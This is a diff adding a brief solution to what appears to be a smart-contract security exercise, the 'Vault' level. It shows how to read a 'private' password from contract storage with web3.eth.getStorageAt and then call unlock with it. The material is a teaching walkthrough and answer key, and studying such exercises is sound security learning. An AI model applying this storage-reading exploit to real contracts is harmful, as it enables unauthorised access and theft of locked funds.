@@ -1,0 +1,12 @@
+Because it is possible to access variables on the blockchain even if they are set to visibility of private,
+
+From the console, entering the following completes the exercise,
+
+STEP 1: declare a variable
+        let thePassword
+
+STEP 2: extract the password from the contract based on its index using a callback function acceptable by metamask for this operation
+        web3.eth.getStorageAt(instance, 1, (err, ans) => thePassword = ans)
+
+STEP 3: break the Vault
+        await contract.unlock(thePassword);
